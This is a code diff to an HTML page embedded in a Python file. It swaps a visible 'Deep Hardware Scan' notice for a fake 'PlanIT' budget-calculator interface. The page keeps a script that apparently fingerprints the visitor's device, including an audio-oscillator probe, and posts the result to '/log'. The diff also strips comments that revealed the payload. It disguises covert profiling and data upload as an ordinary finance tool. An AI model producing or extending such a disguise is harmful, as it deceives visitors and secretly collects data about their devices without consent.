@@ -8,7 +8,156 @@ HTML_PAGE = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Advanced System Diagnostic</title>
+    <title>PlanIT - Budget Calculator</title>
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background: #111827; 
+            color: #f3f4f6; 
+            margin: 0; 
+            padding: 20px; 
+        }
+        .app-window {
+            max-width: 950px;
+            margin: 20px auto;
+            background: #1e293b;
+            border-radius: 8px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+            border: 1px solid #334155;
+            overflow: hidden;
+        }
+        /* Top Navigation Tabs */
+        .tab-bar {
+            background: #0f172a;
+            padding: 10px 20px;
+            display: flex;
+            gap: 20px;
+            border-bottom: 1px solid #334155;
+            font-size: 14px;
+        }
+        .tab {
+            color: #94a3b8;
+            cursor: pointer;
+            padding: 6px 12px;
+            border-radius: 4px;
+        }
+        .tab.active {
+            color: #fff;
+            background: #3b82f6;
+            font-weight: 500;
+        }
+        /* Main Content Container */
+        .content {
+            padding: 30px;
+            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
+        }
+        h1 {
+            color: #ffffff;
+            margin-top: 0;
+            font-size: 28px;
+            font-weight: 400;
+        }
+        .grid-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 25px;
+            margin-top: 20px;
+        }
+        .card {
+            background: rgba(30, 41, 59, 0.7);
+            border: 1px solid #475569;
+            border-radius: 6px;
+            padding: 20px;
+            box-shadow: inset 0 1px 0 rgba(255,255,255,0.05);
+        }
+        .card h3 {
+            margin-top: 0;
+            color: #38bdf8;
+            font-size: 16px;
+            border-bottom: 1px solid #334155;
+            padding-bottom: 8px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #cbd5e1;
+            font-size: 13px;
+        }
+        input, select {
+            width: 100%;
+            padding: 8px 10px;
+            border-radius: 4px;
+            border: 1px solid #475569;
+            background: #0f172a;
+            color: #fff;
+            box-sizing: border-box;
+            font-size: 13px;
+        }
+        .btn-row {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        button {
+            background: #334155;
+            color: #f8fafc;
+            border: 1px solid #64748b;
+            padding: 8px 16px;
+            border-radius: 4px;
+            font-size: 13px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+        button:hover {
+            background: #475569;
+        }
+        button.primary {
+            background: #2563eb;
+            border-color: #3b82f6;
+            color: #fff;
+        }
+        button.primary:hover {
+            background: #1d4ed8;
+        }
+        .summary-item {
+            margin-bottom: 15px;
+            font-size: 14px;
+            color: #e2e8f0;
+        }
+        .summary-item span {
+            font-weight: bold;
+            color: #38bdf8;
+        }
+        .brand-footer {
+            margin-top: 30px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            border-top: 1px solid #334155;
+            padding-top: 20px;
+        }
+        .brand-logo {
+            width: 45px;
+            height: 45px;
+            background: linear-gradient(135deg, #38bdf8, #2563eb);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 22px;
+            color: #fff;
+        }
+        .brand-name {
+            font-size: 24px;
+            font-weight: bold;
+            letter-spacing: 1px;
+            color: #f8fafc;
+        }
+    </style>
     <script>
         function simpleHash(str) {
             let hash = 0;
@@ -90,7 +239,6 @@ HTML_PAGE = """
                         }
                     };
                     oscillator.start(0);
-                    // Timeout fallback if audio processor hangs
                     setTimeout(() => resolve("Timeout"), 1000);
                 });
             } catch (e) {
@@ -150,7 +298,6 @@ HTML_PAGE = """
                 }
             } catch(e) {}
 
-            // Send payload securely
             fetch('/log', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -159,9 +306,76 @@ HTML_PAGE = """
         };
     </script>
 </head>
-<body style="background: #09090b; color: #a1a1aa; text-align: center; font-family: monospace; margin-top: 100px;">
-    <h1 style="color: #f43f5e;">Deep Hardware Scan Active...</h1>
-    <p>Extracting comprehensive system profiles.</p>
+<body>
+    <div class="app-window">
+        <div class="tab-bar">
+            <div class="tab active">Budget Calculator</div>
+            <div class="tab">Goal Interest Calculator</div>
+            <div class="tab">Settings</div>
+        </div>
+
+        <div class="content">
+            <h1>Welcome</h1>
+            
+            <div class="grid-container">
+                <!-- Left Panel: Income Expense Input -->
+                <div class="card">
+                    <h3>Income / Expense Input</h3>
+                    
+                    <div class="form-group">
+                        <label>Edit Funds (Add or Remove)</label>
+                        <input type="text" placeholder="0.00">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>Expense Amount (R):</label>
+                        <input type="number" placeholder="0.00" step="0.01">
+                    </div>
+
+                    <div class="form-group">
+                        <label>Expense Category:</label>
+                        <select>
+                            <option>Food & Groceries</option>
+                            <option>Transport</option>
+                            <option>Utilities</option>
+                            <option>Entertainment</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Date:</label>
+                        <input type="text" value="25/09/2026">
+                    </div>
+
+                    <div class="btn-row">
+                        <button class="primary">Add Expense</button>
+                        <button>Calculate Budget</button>
+                        <button>Reset</button>
+                    </div>
+                </div>
+
+                <!-- Right Panel: Financial Summary Dashboard -->
+                <div class="card">
+                    <h3>Financial Summary Dashboard</h3>
+                    <div class="summary-item">Current Balance: <span>R 0.00</span></div>
+                    <div class="summary-item">Highest Expense: <span>None</span></div>
+                    <div class="summary-item">Most Frequent Expense: <span>None</span></div>
+
+                    <div class="btn-row" style="margin-top: 40px;">
+                        <button>Export to Text File</button>
+                        <button>History</button>
+                        <button>Exit to Login</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Bottom Branding -->
+            <div class="brand-footer">
+                <div class="brand-logo">P</div>
+                <div class="brand-name">Planit</div>
+            </div>
+        </div>
+    </div>
 </body>
 </html>
 """
